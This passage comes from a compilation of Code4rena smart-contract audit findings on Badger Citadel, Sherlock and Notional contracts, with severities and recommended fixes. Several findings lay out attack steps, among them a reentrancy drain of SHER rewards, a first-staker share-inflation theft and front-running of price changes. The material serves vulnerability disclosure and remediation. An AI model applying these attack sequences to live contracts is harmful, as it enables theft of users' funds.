require statement that makes the whole transaction revert: <https://github.com/code-423n4/2022-04-badger-citadel/blob/main/src/StakedCitadel.sol#L769>

### Recommended Mitigation Steps

Change the `getAmountOut()` function to:

```sol
    function getAmountOut(uint256 _assetAmountIn)
        public
        view
        returns (uint256 citadelAmount_)
    {

        uint256 citadelAmount_ = _assetAmountIn * citadelPriceInAsset;

        if (funding.discount > 0) {
            citadelAmount_ =
                (citadelAmount_ * MAX_BPS) /
                (MAX_BPS - funding.discount);
        }

        citadelAmount_ = citadelAmount_ / assetDecimalsNormalizationValue;
    }
```

 



***"
110.md,KnightingRound tokenOutPrice changes,medium,"`Function.buy` buys the tokens for whatever price is set as `tokenOutPrice`. This might lead to accidental collisions or front-running attacks when user is trying to buy the tokens and his transaction is being included after the transaction of changing the price of the token via `setTokenOutPrice`.

Scenario:

1.  User wants to `buy` tokens and can see price `tokenOutPrice`
2.  User likes the price and issues a transaction to `buy` tokens
3.  At the same time `CONTRACT_GOVERNANCE_ROLE` account is increasing `tokenOutPrice` through `setTokenOutPrice`
4.  `setTokenOutPrice` transaction is included before user's `buy` transaction
5.  User buys tokens with the price he was not aware of

Another variation of this attack can be performed using front-running.

### Proof of Concept

*   <https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/KnightingRound.sol#L162-L204>

### Tools Used

Manual Review / VSCode

### Recommended Mitigation Steps

It is recommended to add additional parameter `uint256 believedPrice` to `KnightingRound.buy` function and check if `believedPrice` is equal to `tokenOutPrice`.

 


***"
110.md,New vest reset `unlockBegin` of existing vest without removing vested amount,medium,"<https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/StakedCitadelVester.sol#L143>

<https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/StakedCitadelVester.sol#L109>

### Impact

When `vest` is called by xCTDL vault, the previous amount will re-lock according to the new vesting timeline. While this is as described in L127, `claimableBalance` might revert due to underflow if `vesting[recipient].claimedAmounts` > 0 because the user will need to vest the `claimedAmounts` again which should not be an expected behavior as it is already vested.

### Proof of Concept

<https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/StakedCitadelVester.sol#L143>

            vesting[recipient].lockedAmounts =
                vesting[recipient].lockedAmounts +
                _amount;
            vesting[recipient].unlockBegin = _unlockBegin;
            vesting[recipient].unlockEnd = _unlockBegin + vestingDuration;

<https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/StakedCitadelVester.sol#L109>

            uint256 locked = vesting[recipient].lockedAmounts;
            uint256 claimed = vesting[recipient].claimedAmounts;
            if (block.timestamp >= vesting[recipient].unlockEnd) {
                return locked - claimed;
            }
            return
                ((locked * (block.timestamp - vesting[recipient].unlockBegin)) /
                    (vesting[recipient].unlockEnd -
                        vesting[recipient].unlockBegin)) - claimed;

### Recommended Mitigation Steps

Reset claimedAmounts on new vest

            vesting[recipient].lockedAmounts =
                vesting[recipient].lockedAmounts - 
                vesting[recipient].claimedAmounts +
                _amount;
            vesting[recipient].claimedAmounts = 0
            vesting[recipient].unlockBegin = _unlockBegin;
            vesting[recipient].unlockEnd = _unlockBegin + vestingDuration;





***"
110.md,Stale price used when `citadelPriceFlag` is cleared,medium,"During the [video](https://drive.google.com/file/d/1hCzQrgZEsbd0t2mtuaXm7Cp3YS-ZIlw3/view?usp=sharing) it was explained that the policy operations team was meant to be a nimble group that could change protocol values considered to be safe. Further, it was explained that since pricing comes from an oracle, and there would have to be unusual coordination between the two to affect outcomes, the group was given the ability to clear the pricing flag to get things moving again once the price was determined to be valid

### Impact

If an oracle price falls out of the valid min/max range, the `citadelPriceFlag` is set to true, but the out-of-bounds value is not stored. If the policy operations team calls `clearCitadelPriceFlag()`, the stale price from before the flag will be used. Not only is it an issue because of stale prices, but this means the policy op team now has a way to affect pricing not under the control of the oracle (i.e. no unusual coordination required to affect an outcome). Incorrect pricing leads to incorrect asset valuations, and loss of funds.

### Proof of Concept

The flag is set but the price is not stored
File: src/Funding.sol (lines [427-437](https://github.com/code-423n4/2022-04-badger-citadel/blob/18f8c392b6fc303fe95602eba6303725023e53da/src/Funding.sol#L427-L437))

```solidity
        if (
            _citadelPriceInAsset < minCitadelPriceInAsset ||
            _citadelPriceInAsset > maxCitadelPriceInAsset
        ) {
            citadelPriceFlag = true;
            emit CitadelPriceFlag(
                _citadelPriceInAsset,
                minCitadelPriceInAsset,
                maxCitadelPriceInAsset
            );
        } else {
```

### Tools Used

Code inspection

### Recommended Mitigation Steps

Always set the `citadelPriceInAsset`





***"
76.md,first user can steal everyone else's tokens,high,"A user who joins the systems first (stakes first) can steal everybody's tokens by sending tokens to the system externally.
This attack is possible because you enable staking a small amount of tokens.

### Proof of Concept

See the following attack:

1.  the first user (user A) who enters the system stake 1 token
2.  another user (user B) is about to stake X tokens
3.  user A frontrun and transfer X tokens to the system via `ERC20.transfer`
4.  user B stakes X tokens, and the shares he receives is:

`shares = (_amount * totalStakeShares_) / (totalTokenBalanceStakers() - _amount);`
`shares = (X * 1) / (X + 1 + X - X) = X/(X+1) = 0` meaning all the tokens he staked got him no shares, and those tokens are now a part of the single share that user A holds
5\. user A can now redeem his shares and get the 1 token he staked, the X tokens user B staked, and the X tokens he `ERC20.transfer` to the system because all the money in the system is in a single share that user A holds.

In general, since there is only a single share, for any user who is going to stake X tokens, if the system has X+1 tokens in its balance, the user won't get any shares and all the money will go to the attacker.

### Recommended Mitigation Steps

Force users to stake at least some amount in the system (Uniswap forces users to pay at least `1e18`)
That way the amount the attacker will need to ERC20.transfer to the system will be at least `X*1e18` instead of `X` which is unrealistic






***"
76.md,`SherlockClaimManager`: Incorrect amounts needed and paid for escalated claims,medium,"When escalating claims, [the documentation](https://docs.sherlock.xyz/claims/claims-process) states that the protocol agent is required to pay and stake a certain amount for the process. If the covered protocol is proven correct, then the amount specified by the claim will be paid out. **They will also receive the stake amount back in full.** If the covered protocol's escalation is not successful, then the amount specified by the claim is not paid out and the stake amount is not returned.

The protocol agent is reasonably expected to pay the following:

*   The stake (`BOND`) and
*   UMA’s final fee

In reality, the protocol agent will end up paying more, as we shall see in the proof of concept.

### Proof of Concept

Let us assume the following:

*   `BOND = 9600` as defined in `SherlockClaimManager`
*   `umaFee = 400` (at the time of writing, this value has been updated to 1500 USDC: see `[Store.computeFinalFee(usdc)](https://etherscan.io/address/0x54f44eA3D2e7aA0ac089c4d8F7C93C27844057BF#readContract)`).

On invoking `escalate()`, the following amounts are required:

1.  `BOND + umaFee = 9600 + 400` will be transferred to UMA when invoking `requestAndProposePriceFor()`

```jsx
// Taken from https://github.com/UMAprotocol/protocol/blob/master/packages/core/contracts/oracle/implementation/SkinnyOptimisticOracle.sol
// Only relevant lines are referenced
uint256 finalFee = _getStore().computeFinalFee(address(currency)).rawValue;
request.finalFee = finalFee;
totalBond = request.bond.add(request.finalFee);
if (totalBond > 0) currency.safeTransferFrom(msg.sender, address(this), totalBond);
```

1.  Another `BOND + umaFee = 9600 + 400` will be transfered when invoking `disputePriceFor()`

```jsx
// Taken from https://github.com/UMAprotocol/protocol/blob/master/packages/core/contracts/oracle/implementation/SkinnyOptimisticOracle.sol#L389-L390
totalBond = request.bond.add(request.finalFee);
if (totalBond > 0) request.currency.safeTransferFrom(msg.sender, address(this), totalBond);
```

However, what’s important to note is that **UMA will “burn” half of the BOND collected + final fee.** This will go against the claim that the protocol agent will be able to reclaim his stake in full.

```jsx
StoreInterface store = _getStore();

// Avoids stack too deep compilation error.
{
    // Along with the final fee, ""burn"" part of the loser's bond to ensure that a larger bond always makes it
    // proportionally more expensive to delay the resolution even if the proposer and disputer are the same
    // party.
    uint256 burnedBond = _computeBurnedBond(disputedRequest);

    // The total fee is the burned bond and the final fee added together.
    uint256 totalFee = request.finalFee.add(burnedBond);

    if (totalFee > 0) {
        request.currency.safeIncreaseAllowance(address(store), totalFee);
        _getStore().payOracleFeesErc20(address(request.currency), FixedPoint.Unsigned(totalFee));
    }
}

function _computeBurnedBond(Request memory request) private pure returns (uint256) {
  // burnedBond = floor(bond / 2)
  return request.bond.div(2);
}
```

We finally note that on settlement, the eventual payout is

```jsx
// Winner gets:
// - Their bond back.
// - The unburned portion of the loser's bond: proposal bond (not including final fee) - burned bond.
// - Their final fee back.
// - The request reward (if not already refunded -- if refunded, it will be set to 0).
payout = request.bond.add(request.bond.sub(_computeBurnedBond(settledRequest))).add(request.finalFee).add(
    request.reward
);
request.currency.safeTransfer(disputeSuccess ? request.disputer : request.proposer, payout);
```

Hence, in reality, the protocol agent will only receive `9600 * 2 - 4800 + 400 = 14800` should the dispute be successful. We note that the burnt amount of `4800 / 2 + 400 = 5200` has been taken by UMA.

One can further verify this behaviour by looking at a past resolution of another protocol:

<https://dashboard.tenderly.co/tx/main/0x0f03f73a2093e385146791e8f2739dbc04b39145476d6940776680243460100f/debugger?trace=0.6.1>

The above example has a bond is `0.0075 ETH`, with UMA’s final fee being 0.2 ETH. We see that UMA takes `0.2 + 0.5 * 0.0075 = 0.02375 ETH`.

Thus, we see that the protocol agent will be charged disproportionally to what is expected.

### Recommended Mitigation Steps

We suggest changing the parameters of `requestAndProposePriceFor()` to

```jsx
UMA.requestAndProposePriceFor(
  UMA_IDENTIFIER, // Sherlock ID so UMA knows the request came from Sherlock
  claim.timestamp, // Timestamp to identify the request
  claim.ancillaryData, // Ancillary data such as the coverage agreement
  TOKEN, // USDC
  BOND, // While sherlock handles rewards on its own, we use the BOND as the reward
  // because using it as UMA's bond would result in 0.5 * BOND charged by UMA excluding final fee
  1, // Ideally 0, but 0 = final fee used. Hence, we set it to the next lowest 
  // possible value
  LIVENESS, // Proposal liveness
  address(sherlockCore), // Sherlock core address
  0 // price
);
```

where `BOND` becomes the reward and the actual bond for UMA is `1`. Ideally, it should be set to 0, but if set as such, UMA interprets it to use the final fee as the bond amount instead.

`[request.bond = bond != 0 ? bond : finalFee;](https://github.com/UMAprotocol/protocol/blob/master/packages/core/contracts/oracle/implementation/SkinnyOptimisticOracle.sol#L321)`

This way, the actual amount required from the protocol agent is the `BOND + 2 * (USDC wei + umaFee)` for the process. He will additionally be returned his `BOND + umaFee` if his dispute is successful.







***"
76.md,`tokenBalanceOfAddress` of `nftOwner` becomes permanently incorrect after `arbRestake`,medium,"Successful `arbRestake` performs `_redeemShares` for `arbRewardShares` amount to extract the arbitrager reward. This effectively reduces shares accounted for an NFT, but leaves untouched the `addressShares` of an `nftOwner`.

As a result the `tokenBalanceOfAddress` function will report an old balance that existed before arbitrager reward was slashed away. This will persist if the owner will transfer the NFT to someone else as its new reduced shares value will be subtracted from `addressShares` in `_beforeTokenTransfer`, leaving the arbitrage removed shares permanently in `addressShares` of the NFT owner, essentially making all further reporting of his balance incorrectly inflated by the cumulative arbitrage reward shares from all arbRestakes happened to the owner's NFTs.

### Proof of Concept

`arbRestake` redeems `arbRewardShares`, which are a part of total shares of an NFT:

[Sherlock.sol#L673](https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L673)

This will effectively reduce the `stakeShares`:

[Sherlock.sol#L491](https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L491)

But there is no mechanics in place to reduce `addressShares` of the owner apart from mint/burn/transfer, so `addressShares` will still correspond to NFT shares before arbitrage. This discrepancy will be accumulated further with arbitrage restakes.

### Recommended Mitigation Steps

Add a flag to `_redeemShares` indicating that it was called for a partial shares decrease, say `isPartialRedeem`, and do `addressShares[nftOwner] -= _stakeShares` when `isPartialRedeem == true`.

Another option is to do bigger refactoring, making stakeShares and addressShares always change simultaneously.






***"
76.md,`updateYieldStrategy` will freeze some funds with the old Strategy if `yieldStrategy` fails to withdraw all the funds because of liquidity issues,medium,"Part of the funds held with the strategy can be frozen if the current strategy has tight liquidity when `updateYieldStrategy` is run as this function makes an attempt to withdraw all the funds and then unconditionally removes the strategy.

The Sherlock to YieldStrategy link will be broken as a result: Sherlock points to the new Strategy, while old Strategy still allows only this Sherlock contract to withdraw.

This way back and forth switches will be required in the future to return the funds: withdraw all from new strategy and switch to old, withdraw all from old and point to new one again, reinvest there.

### Proof of Concept

In peer-to-peer lending protocols it is not always possible for the token supplier to withdraw all what's due. This happens on high utilization of the market (when it has a kind of liquidity crunch).

This way yieldStrategy.withdrawAll is not guaranteed to obtain all the funds held with the strategy:

[Sherlock.sol#L286](https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L286)

The worst case scenario here seems to be the remainder funds to be left frozen within the strategy.

For example, AaveV2Strategy `withdraw` and `withdrawAll` have `onlySherlockCore` modifier:

[AaveV2Strategy.sol#L78-100](https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/managers/AaveV2Strategy.sol#L78-100)

While Sherlock core is immutable for the Strategy by default:

[Manager.sol#L26-41](https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/managers/Manager.sol#L26-41)

### Recommended Mitigation Steps

Consider implementing a new method that fails whenever a strategy cannot withdraw all what's due now, and rename current implementation to, for example, `forceUpdateYieldStrategy`, to have a degree of flexibility around liquidity issues.

Also, to avoid back and forth switching, a strategy argument can be introduced to `yieldStrategyWithdrawAll` to allow withdrawals from any (not only current) yieldStrategy:

[Sherlock.sol#L322](https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L322)

Now:

    function yieldStrategyWithdrawAll() external override onlyOwner {

To be (if `_yieldStrategy` is zero then utilize current):

    function yieldStrategyWithdrawAll(IStrategyManager _yieldStrategy) external override onlyOwner {





***"
76.md,Reenterancy in `_sendSherRewardsToOwner()`,medium,"This is a reentrancy vulnerability that would allow the attacker to drain the entire SHER balance of the contract.

Note: this attack requires gaining control of execution `sher.transfer()` which will depend on the implementation of the SHER token. Control may be gained by the attacker if the contract implements ERC777 or otherwise makes external calls during `transfer()`.

### Proof of Concept

See [\_sendSherRewards](https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L442)

```solidity
  function _sendSherRewardsToOwner(uint256 _id, address _nftOwner) internal {
    uint256 sherReward = sherRewards_[_id];
    if (sherReward == 0) return;

    // Transfers the SHER tokens associated with this NFT ID to the address of the NFT owner
    sher.safeTransfer(_nftOwner, sherReward);
    // Deletes the SHER reward mapping for this NFT ID
    delete sherRewards_[_id];
  }
```

Here `sherRewards` are deleted after the potential external call is made in `sher.safeTransfer()`. As a result if an attacker reenters this function `sherRewards_` they will still maintain the original balance of rewards and again transfer the SHER tokens.

As `_sendSherRewardsToOwner()` is `internal` the attack can be initiated through the `external` function `ownerRestake()` [see here.](https://github.com/code-423n4/2022-01-sherlock/blob/main/contracts/Sherlock.sol#L595)

Steps to produce the attack:

1.  Deploy attack contract to handle reenterancy
2.  Call `initialStake()` from the attack contract with the smallest `period`
3.  Wait for `period` amount of time to pass
4.  Have the attack contract call `ownerRestake()`. The attack contract will gain control of the (See note above about control flow). This will recursively call `ownerRestake()` until the balance of `Sherlock` is 0 or less than the user's reward amount. Then allow reentrancy loop to unwind and complete.

### Recommended Mitigation Steps

Reentrancy can be mitigated by one of two solutions.

The first option is to add a reentrancy guard like `nonReentrant` the is used in `SherlockClaimManager.sol`.

The second option is to use the checks-effects-interactions pattern. This would involve doing all validation checks and state changes before making any potential external calls. For example the above function could be modified as follows.

```solidity
  function _sendSherRewardsToOwner(uint256 _id, address _nftOwner) internal {
    uint256 sherReward = sherRewards_[_id];
    if (sherReward == 0) return;

    // Deletes the SHER reward mapping for this NFT ID
    delete sherRewards_[_id];

    // Transfers the SHER tokens associated with this NFT ID to the address of the NFT owner
    sher.safeTransfer(_nftOwner, sherReward);
  }
```

Additionally the following functions are not exploitable however should be updated to use the check-effects-interations pattern.

*   `Sherlock._redeemShares()` should do `_transferTokensOut()` last.
*   `Sherlock.initialStake()` should do `token.safeTransferFrom(msg.sender, address(this), _amount);` last
*   `SherClaim.add()` should do `sher.safeTransferFrom(msg.sender, address(this), _amount);` after updating `userClaims`
*   `SherlockProtocolManager.depositToActiveBalance()` should do `token.safeTransferFrom(msg.sender, address(this), _amount);` after updating `activeBalances`



 



***"
124.md,Rounding Issues In Certain Functions,high,"<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L52>

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L134>

### Background

Per EIP 4626's Security Considerations (<https://eips.ethereum.org/EIPS/eip-4626>)

> Finally, ERC-4626 Vault implementers should be aware of the need for specific, opposing rounding directions across the different mutable and view methods, as it is considered most secure to favor the Vault itself during calculations over its users:
>
> *   If (1) it’s calculating how many shares to issue to a user for a certain amount of the underlying tokens they provide or (2) it’s determining the amount of the underlying tokens to transfer to them for returning a certain amount of shares, it should round *down*.
> *   If (1) it’s calculating the amount of shares a user has to supply to receive a given amount of the underlying tokens or (2) it’s calculating the amount of underlying tokens a user has to provide to receive a certain amount of shares, it should round *up*.

Thus, the result of the `previewMint` and `previewWithdraw` should be rounded up.

### Proof of Concept

The current implementation of `convertToShares` function will round down the number of shares returned due to how solidity handles Integer Division. ERC4626 expects the returned value of `convertToShares` to be rounded down. Thus, this function behaves as expected.

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L52>

```solidity
function convertToShares(uint256 assets) public view override returns (uint256 shares) {
    uint256 supply = totalSupply();
    if (supply == 0) {
        // Scales assets by the value of a single unit of fCash
        uint256 unitfCashValue = _getPresentValue(uint256(Constants.INTERNAL_TOKEN_PRECISION));
        return (assets * uint256(Constants.INTERNAL_TOKEN_PRECISION)) / unitfCashValue;
    }

    return (assets * totalSupply()) / totalAssets();
}
```

ERC 4626 expects the result returned from `previewWithdraw` function to be rounded up. However, within the `previewWithdraw` function, it calls the `convertToShares` function. Recall earlier that the `convertToShares` function returned a rounded down value,  thus `previewWithdraw` will return a rounded down value instead of round up value. Thus, this function does not behave as expected.

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L134>

```solidity
function previewWithdraw(uint256 assets) public view override returns (uint256 shares) {
    if (hasMatured()) {
        shares = convertToShares(assets);
    } else {
        // If withdrawing non-matured assets, we sell them on the market (i.e. borrow)
        (uint16 currencyId, uint40 maturity) = getDecodedID();
        (shares, /* */, /* */) = NotionalV2.getfCashBorrowFromPrincipal(
            currencyId,
            assets,
            maturity,
            0,
            block.timestamp,
            true
        );
    }
}
```

`previewWithdraw` and `previewMint` functions rely on `NotionalV2.getfCashBorrowFromPrincipal` and `NotionalV2.getDepositFromfCashLend` functions. Due to the nature of time-boxed contest, I was unable to verify if `NotionalV2.getfCashBorrowFromPrincipal` and `NotionalV2.getDepositFromfCashLend` functions return a rounded down or up value. If a rounded down value is returned from these functions, `previewWithdraw` and `previewMint` functions would not behave as expected.

### Impact

Other protocols that integrate with Notional's fCash wrapper might wrongly assume that the functions handle rounding as per ERC4626 expectation. Thus, it might cause some intergration problem in the future that can lead to wide range of issues for both parties.

### Recommended Mitigation Steps

Ensure that the rounding of vault's functions behave as expected. Following are the expected rounding direction for each vault function:

*   previewMint(uint256 shares) - Round Up ⬆

*   previewWithdraw(uint256 assets) - Round Up ⬆

*   previewRedeem(uint256 shares) - Round Down ⬇

*   previewDeposit(uint256 assets) - Round Down ⬇

*   convertToAssets(uint256 shares) - Round Down ⬇

*   convertToShares(uint256 assets) - Round Down ⬇

`previewMint` returns the  amount of assets that would be deposited to mint specific amount of shares. Thus, the amount of assets must be rounded up, so that the vault won't be shortchanged.

`previewWithdraw` returns the amount of shares that would be burned to withdraw specific amount of asset. Thus, the amount of shares must to be rounded up, so that the vault won't be shortchanged.

Following is the OpenZeppelin's vault implementation for rounding reference:

<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20TokenizedVault.sol>

Alternatively, if such alignment of rounding could not be achieved due to technical limitation, at the minimum, document this limitation in the comment so that the developer performing the integration is aware of this.




> EIP4626 is aimed to create a consistent and robust implementation patterns for Tokenized Vaults. A slight deviation from 4626 would broke composability and potentially lead to loss of fund (POC in https://github.com/code-423n4/2022-06-notional-coop-findings/issues/88 can be an example). It is counterproductive to implement EIP4626 but does not conform to it fully. Especially it does seem that most of the time `deposit` would be successful but not `withdraw`, making it even more dangerous when an immutable consumer application mistakenly used the wfcash contract.



***"
124.md,fCash of the wrong maturity and asset can be sent to wrapper address before wrapper is deployed,medium,"Minting becomes impossible

### Proof of Concept

onERC1155Received is only called when the size of the code deployed at the address contains code. Since create2 is used to deploy the contract, the address can be calculated before the contract is deployed. A malicious actor could send the address fCash of a different maturity or asset before the contract is deployed and since nothing has been deployed, onERC1155Received will not be called and the address will accept the fCash. After the contract is deployed and correct fCash is sent to the address, onERC1155Received will check the length of the assets held by the address and it will be more than 1 (fCash of correct asset and maturity and fCash with wrong maturity or asset sent before deployment). This will cause the contract to always revert essentially breaking the mint completely.

### Recommended Mitigation Steps

When the contract is created create a function that reads how many fCash assets are at the address and send them away if they aren't of the correct asset and maturity


 > Based on the Judging Criteria, this does not result in loss of funds. This will result in a loss of availability (available funds actually increase).
> 
> My opinion is medium severity.
> 




***"
124.md,deposit() and mint() and _redeemInternal() in wfCashERC4626() will revert for all fcash that asset token is underlying token because they always call _mintInternal() with useUnderlying==True,medium,"<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L177-L184>

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L168-L175>

<https://github.com/code-423n4/2022-06-notional-coop/blob/6f8c325f604e2576e2fe257b6b57892ca181509a/notional-wrapped-fcash/contracts/wfCashERC4626.sol#L225-L241>

### Impact

For some `fcash` the asset token is underlying token (`asset.tokenType == TokenType.NonMintable`) and `NotionalV2` will not handle minting with `useUnderlying==True` for those `fcash`s (according to what I asked from sponsor). In summery most of the logics in `wfCashERC4626` will not work for those `fcash` tokens.

when for some `fcash` asset token is underlying token, all calls to `NotionalV2` should be with `useUnderlying==False`. but `deposit()` and `mint()` in `wfCashERC4626` contract call `_mintInternal()` with `useUnderlying==True` and it calls `NotionalV2.batchLend()` with `depositUnderlying==true` so the `NotionV2` call will fail for `fcash` tokens that asset token is underlying token and it would cause  that `deposit()` and `mint()`  logic `wfCashERC4626`  will not work and contract will be useless for those tokens.
`_redeemInternal()` issue is similar and it calls `_burn()` with `redeemToUnderlying: true` which execution eventually calls `NotionalV2.batchBalanceAndTradeAction()` with `toUnderlying=True` which will revert so `_redeemInternal()` will fail and because `withdraw()` and `redeem` use it, so they will not work too for those `fcash` tokens that asset token is underlying token.

### Proof of Concept

This is `deposit()` and `mint()`  code in `wfCashERC4626`:

        /** @dev See {IERC4626-deposit} */
        function deposit(uint256 assets, address receiver) public override returns (uint256) {
            uint256 shares = previewDeposit(assets);
            // Will revert if matured
            _mintInternal(assets, _safeUint88(shares), receiver, 0, true);
            emit Deposit(msg.sender, receiver, assets, shares);
            return shares;
        }

        /** @dev See {IERC4626-mint} */
        function mint(uint256 shares, address receiver) public override returns (uint256) {
            uint256 assets = previewMint(shares);
            // Will revert if matured
            _mintInternal(assets, _safeUint88(shares), receiver, 0, true);
            emit Deposit(msg.sender, receiver, assets, shares);
            return assets;
        }

As you can see they both call `_mintInternal()` with last parameter as `true` which is `useUnderlying`'s value. This is `_mintInternal()` code:

        function _mintInternal(
            uint256 depositAmountExternal,
            uint88 fCashAmount,
            address receiver,
            uint32 minImpliedRate,
            bool useUnderlying
        ) internal nonReentrant {
            require(!hasMatured(), ""fCash matured"");
            (IERC20 token, bool isETH) = getToken(useUnderlying);
            uint256 balanceBefore = isETH ? address(this).balance : token.balanceOf(address(this));

            // If dealing in ETH, we use WETH in the wrapper instead of ETH. NotionalV2 uses
            // ETH natively but due to pull payment requirements for batchLend, it does not support
            // ETH. batchLend only supports ERC20 tokens like cETH or aETH. Since the wrapper is a compatibility
            // layer, it will support WETH so integrators can deal solely in ERC20 tokens. Instead of using
            // ""batchLend"" we will use ""batchBalanceActionWithTrades"". The difference is that ""batchLend""
            // is more gas efficient (does not require and additional redeem call to asset tokens). If using cETH
            // then everything will proceed via batchLend.
            if (isETH) {
                IERC20((address(WETH))).safeTransferFrom(msg.sender, address(this), depositAmountExternal);
                WETH.withdraw(depositAmountExternal);

                BalanceActionWithTrades[] memory action = EncodeDecode.encodeLendETHTrade(
                    getCurrencyId(),
                    getMarketIndex(),
                    depositAmountExternal,
                    fCashAmount,
                    minImpliedRate
                );
                // Notional will return any residual ETH as the native token. When we _sendTokensToReceiver those
                // native ETH tokens will be wrapped back to WETH.
                NotionalV2.batchBalanceAndTradeAction{value: depositAmountExternal}(address(this), action);
            } else {
                // Transfers tokens in for lending, Notional will transfer from this contract.
                token.safeTransferFrom(msg.sender, address(this), depositAmountExternal);

                // Executes a lending action on Notional
                BatchLend[] memory action = EncodeDecode.encodeLendTrade(
                    getCurrencyId(),
                    getMarketIndex(),
                    fCashAmount,
                    minImpliedRate,
                    useUnderlying
                );
                NotionalV2.batchLend(address(this), action);
            }

            // Mints ERC20 tokens for the receiver, the false flag denotes that we will not do an
            // operatorAck
            _mint(receiver, fCashAmount, """", """", false);

            _sendTokensToReceiver(token, msg.sender, isETH, balanceBefore);
        }

As you can see it calls `NotionalV2` functions with `useUnderlying=True` but according to sponsor clarification `NotionalV2` would fail and revert for those calls because `useUnderlying=True` and `fcash`'s asset token is underlying token (`asset.tokenType == TokenType.NonMintable`).
So in summery for `fcash` tokens which asset token is underlying token `NotionalV2` won't handle calls which include `useUnderlying==True` but in `wfCashERC4626` contract functions like `deposit()`, `mint()`, `withdraw()` and `redeem()` they all uses `useUnderlying==True` always so `wfCashERC4626` won't work for those specific type of tokens which asset token is underlying token(`asset.tokenType == TokenType.NonMintable`)

the detail explanations for functions `withdraw()` and `redeem()` are similar.

### Tools Used

VIM

### Recommended Mitigation Steps

Check that if for that `fcash` token asset token  is underlying token or not and set `useUnderlying` based on that.






***"
124.md,The logic of _isUnderlying() in NotionalTradeModule is wrong which will cause mintFCashPosition() and redeemFCashPosition() revert on `fcash` tokens which asset token is underlying token (asset.tokenType == TokenType.NonMintable),medium,"For some `fcash` the asset token is underlying token (`asset.tokenType == TokenType.NonMintable`) and `NotionalV2` will not handle minting or burning when it is called with `useUnderlying==True` for those `fcash`s (according to what I asked from sponsor). In summery most of the logics in ` NotionalTradeModule  ` will not work for those `fcash` tokens because `_isUnderlying()` returns `true` result for those tokens which would make `NotionalTradeModule`'s logic for `mintFCashPosition()` and `redeemFCashPosition()` will eventually call `redeemToUnderlying()` and `mintViaUnderlying()` in `wfCashLogic` and those function in `wfCashLogic` will call `NotionalV2` with `useUnderlying==True` and `NotionalV2` will fail and revert for `fcash` tokens which asset token is underlying token, so the whole transaction will fail and `_mintFCashPosition()` and `_redeemFCashPosition()`  logic in ` NotionalTradeModule  ` will not work for those `fcash` tokens and manager can't add them to `set` protocol.

### Proof of Concept

when for some `fcash` asset token is underlying token, all calls to `NotionalV2` should be with `useUnderlying==False`. but `_isUnderlying()` in `NotionalTradeModule` contract first check that `isUnderlying = _paymentToken == underlyingToken` so for `fcash` tokens where asset token is underlying token it is going to return `isUnderlying==True`. let's assume that for some specific `fcash` asset token is underlying token (`asset.tokenType == TokenType.NonMintable`) and follow the code execution.
This is `_isUnderlying()` code in `NotionalTradeModule`:

        function _isUnderlying(
            IWrappedfCashComplete _fCashPosition,
            IERC20 _paymentToken
        )
        internal
        view
        returns(bool isUnderlying)
        {
            (IERC20 underlyingToken, IERC20 assetToken) = _getUnderlyingAndAssetTokens(_fCashPosition);
            isUnderlying = _paymentToken == underlyingToken;
            if(!isUnderlying) {
                require(_paymentToken == assetToken, ""Token is neither asset nor underlying token"");
            }
        }

As you can see it calls `_getUnderlyingAndAssetTokens()` and then check `_paymentToken == underlyingToken` to see that if payment token is equal to `underlyingToken`. `_getUnderlyingAndAssetTokens()` uses `getUnderlyingToken()` and `getAssetToken()` in `wfCashBase`. This is `getUnderlyingToken()` code in `wfCashBase`:

        /// @notice Returns the token and precision of the token that this token settles
        /// to. For example, fUSDC will return the USDC token address and 1e6. The zero
        /// address will represent ETH.
        function getUnderlyingToken() public view override returns (IERC20 underlyingToken, int256 underlyingPrecision) {
            (Token memory asset, Token memory underlying) = NotionalV2.getCurrency(getCurrencyId());

            if (asset.tokenType == TokenType.NonMintable) {
                // In this case the asset token is the underlying
                return (IERC20(asset.tokenAddress), asset.decimals);
            } else {
                return (IERC20(underlying.tokenAddress), underlying.decimals);
            }
        }

As you can see for our specific `fcash` token this function will return asset token as underlying token. so for this specific `fcash` token, the asset token and underlying token will be same in `_isUnderlying()` of `NationalTradeModule` but because code first check `isUnderlying = _paymentToken == underlyingToken` so the function will return `isUnderlying=True` as a result for our specific `fcash` token (which asset token is underlying token)
This is `_mintFCashPosition()` and `_redeemFCashPosition()` code in ` NotionalTradeModule  `:

        /**
         * @dev Redeem a given fCash position from the specified send token (either underlying or asset token)
         * @dev Alo adjust the components / position of the set token accordingly
         */
        function _mintFCashPosition(
            ISetToken _setToken,
            IWrappedfCashComplete _fCashPosition,
            IERC20 _sendToken,
            uint256 _fCashAmount,
            uint256 _maxSendAmount
        )
        internal
